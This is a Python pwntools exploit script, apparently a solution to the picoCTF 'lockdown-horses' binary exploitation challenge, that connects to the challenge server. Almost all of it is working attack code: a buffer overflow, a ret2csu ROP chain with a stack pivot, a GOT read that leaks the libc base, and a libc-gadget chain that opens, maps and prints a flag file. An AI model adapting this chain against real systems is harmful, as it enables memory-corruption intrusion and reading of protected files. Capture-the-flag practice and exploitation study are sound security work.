import struct
import sys
from pwn import *
from ctypes import CDLL

#####################################################change directory#################################3
level = "lockdown-horses"
ip = "mars.picoctf.net:31809"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

####################################################operation mode#####################################################
args.DEBUG = False
args.ASLR = False
args.hook = "define hook-stop\nprint /x $rsi\nend\n"
args.gdbscript = args.hook + "b *0x400740\nb *0x400790\ncatch syscall mmap\n"
args.REMOTE = True
####################################################setup solution#####################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/horse_patched")
libc = ELF(dir + "/libc.so.6")
####################################################start process######################################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, aslr=args.ASLR, gdbscript=args.gdbscript)
    else:
        return process([binary.path])
r = conn()
###################################################info gathering######################################################
read_plt_addr = 0x400790
read_got_addr = 0x601fd8
write_plt_addr = 0x400740
write_got_addr = 0x601fb0
pop_rdi = 0x400c03                           # pop rdi ; ret
pop_rsi = 0x400c01                           # pop rsi ; pop r15 ; ret
pop_rsp = 0x400bfd                           # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
csu_pop_regis = 0x400bfa                     # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
csu_call_function = 0x400be0                 # mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d; call [r12+rbx*8]
writeable_addr = 0x602000       
original_overflow = b"a"*40
new_overflow = b"a"*24
###############################################helper function#########################################################
def func_call(func_addr, arg1, arg2, arg3):
    return struct.pack("<QQQQQQQ", csu_pop_regis, 0, 1, func_addr, arg1, arg2, arg3) + struct.pack("<QQQQQQQQ",csu_call_function, 0xdeadbeef, 0, 0, 0, 0, 0, 0)
###############################################making new stack space##################################################
payload = original_overflow + struct.pack("<QQ", pop_rdi, 0) + struct.pack("<QQQ", pop_rsi, writeable_addr, 0) + struct.pack("<Q", read_plt_addr)
payload += struct.pack("<QQ", pop_rsp, writeable_addr)
r.sendline(payload)
###############################################get libc address########################################################
payload = new_overflow + func_call(write_got_addr, 1, read_got_addr, 8)            #writing the read got address on stdout
payload += func_call(read_got_addr, 0, writeable_addr + 0xf00, 48)                #writing ./\x00 in heap to use in open
payload += func_call(read_got_addr, 0, writeable_addr, 0x1000)                     #writing new stack overflow code in heap
payload += struct.pack("<QQ", pop_rsp, writeable_addr)                             #changing the rsp value to writeable_addr
r.sendlineafter("/     /", payload)
r.recvuntil("\n")
value = r.recv().strip().ljust(8, b"\x00")
leaked_addr_read_libc = struct.unpack("l", value)[0]
log.info("Leaked server's libc address, read(): " + hex(leaked_addr_read_libc))

server_libc_base_addr = leaked_addr_read_libc - libc.symbols['read']
libc.address = server_libc_base_addr
log.info("Leaked server's libc address: " + hex(server_libc_base_addr))
##################################################libc gadgets#########################################################
pop_rdi_libc = server_libc_base_addr + 0x26b72                           #pop rdi ; ret 
pop_rsi_libc = server_libc_base_addr + 0x27529                           #pop rsi ; ret 
pop_rax_libc = server_libc_base_addr + 0x4a550                           #pop rax ; ret 
pop_rdx_libc = server_libc_base_addr + 0x11c371                          #pop rdx ; pop r12 ; ret 
pop_rsp_libc = server_libc_base_addr + 0x32b5a                           #pop rsp ; ret 
pop_rcx_libc = server_libc_base_addr + 0x9f822                           #pop rcx ; ret 
rdx_to_r10_jmp_rax_libc = server_libc_base_addr + 0x7b0cb                #mov r10, rdx ; jmp rax
simple_ret_libc = server_libc_base_addr + 0xb4ed9                        #xor rax, rax ; ret
set_r9_zero_libc = server_libc_base_addr + 0xc9ccf                       #xor r9d, r9d ; mov eax, r9d ; ret
rax_to_r8_libc = server_libc_base_addr + 0x00122937              #mov r8d, eax ; mov eax, r8d ; ret
syscall_libc = server_libc_base_addr + 0x66229                           #syscall ret 
flag_name = "flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt"
#############################################reading flag file######################################################
#store flag name in memory(0x602f00) to use in open
payload = "./" + flag_name + "\x00"
r.send(payload.encode())
payload = new_overflow
#open(0x602f00, O_RDONLY[=0])
payload += struct.pack("<QQ", pop_rdi_libc, writeable_addr + 0xf00) + struct.pack("<QQ", pop_rsi_libc, 0) + struct.pack("<QQ", pop_rax_libc, 2) + struct.pack("<Q", syscall_libc)
#mmap(0x602e00, 0x1000, PROT_READ[=1], MAP_FIXED| MAP_PRIVATE[=0x12], 3, 0)
#setup 1st arg
payload += struct.pack("<QQ", pop_rdi_libc, 0x603000)
#setup 2nd arg
payload += struct.pack("<QQ", pop_rsi_libc, 0x100)
#setup 4th arg
payload += struct.pack("<QQQ", pop_rdx_libc, 0x11, 0x0) + struct.pack("<QQ", pop_rax_libc, simple_ret_libc) + struct.pack("<Q", rdx_to_r10_jmp_rax_libc)
payload += struct.pack("<QQ", pop_rcx_libc, 0x11)
#setup 5th arg
payload += struct.pack("<QQ", pop_rax_libc, 0x3) + struct.pack("<Q", rax_to_r8_libc)
#setup 6th arg
payload += struct.pack("<Q", set_r9_zero_libc)
#setup 3rd arg
payload += struct.pack("<QQQ", pop_rdx_libc, 0x1, 0x0)
#call
payload += struct.pack("<Q", libc.sym['mmap'])
#write(1, 0x602e00, 0x100)
payload += struct.pack("<QQ", pop_rdi_libc, 1) + struct.pack("<QQ", pop_rsi_libc, 0x603000) + struct.pack("<QQQ", pop_rdx_libc, 0x100, 0) + struct.pack("<Q", write_plt_addr)
r.send(payload)
r.interactive()